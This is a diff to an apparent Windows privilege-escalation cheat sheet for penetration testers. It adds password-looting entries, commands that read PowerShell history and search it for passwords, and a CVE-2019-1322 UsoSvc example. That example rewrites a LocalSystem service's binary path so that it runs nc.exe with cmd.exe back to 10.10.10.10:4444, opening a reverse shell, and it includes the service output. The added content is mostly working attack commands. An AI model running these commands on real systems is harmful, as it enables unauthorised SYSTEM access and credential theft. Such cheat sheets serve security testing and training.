@@ -7,6 +7,14 @@
 * [User Enumeration](#user-enumeration)
 * [Network Enumeration](#network-enumeration)
 * [EoP - Looting for passwords](#eop---looting-for-passwords)
+    * [SAM and SYSTEM files](#sam-and-system-files)
+    * [Search for file contents](#search-for-file-contents)
+    * [Search for a file with a certain filename](#search-for-a-file-with-a-certain-filename)
+    * [Search the registry for key names and passwords](#search-the-registry-for-key-names-and-passwords)
+    * [Passwords in unattend.xml](#passwords-in-unattend.xml)
+    * [Wifi passwords](#wifi-passwords)
+    * [Passwords stored in services](#passwords-stored-in-services)
+    * [Powershell history](#powershell-history)
 * [EoP - Processes Enumeration and Tasks](#eop---processes-enumeration-and-tasks)
 * [EoP - Incorrect permissions in services](#eop---incorrect-permissions-in-services)
 * [EoP - Windows Subsystem for Linux (WSL)](#eop---windows-subsystem-for-linux-wsl)
@@ -381,6 +389,13 @@ Invoke-SessionGopher -AllDomain -o
 Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ```
 
+### Powershell history
+
+```powershell
+type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+cat (Get-PSReadlineOption).HistorySavePath
+cat (Get-PSReadlineOption).HistorySavePath | sls passw
+```
 
 ## EoP - Processes Enumeration and Tasks
 
@@ -468,7 +483,33 @@ Note to check file permissions you can use `cacls` and `icacls`
 
 You are looking for `BUILTIN\Users:(F)`(Full access), `BUILTIN\Users:(M)`(Modify access) or  `BUILTIN\Users:(W)`(Write-only access) in the output.
 
-### Example with Windows XP SP1
+### Example with Windows 10 - CVE-2019-1322 UsoSvc
+
+Prerequisite: Service account
+
+```powershell
+PS C:\Windows\system32> sc.exe stop UsoSvc
+PS C:\Windows\system32> sc.exe config UsoSvc binPath="cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\a.txt"
+PS C:\Windows\system32> sc.exe config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 10.10.10.10 4444 -e cmd.exe"
+PS C:\Windows\system32> sc.exe config UsoSvc binpath= "C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe"
+PS C:\Windows\system32> sc.exe qc usosvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: usosvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START  (DELAYED)
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Update Orchestrator Service
+        DEPENDENCIES       : rpcss
+        SERVICE_START_NAME : LocalSystem
+
+PS C:\Windows\system32> sc.exe start UsoSvc
+```
+
+### Example with Windows XP SP1 - upnphost
 
 ```powershell
 # NOTE: spaces are mandatory for this exploit to work !
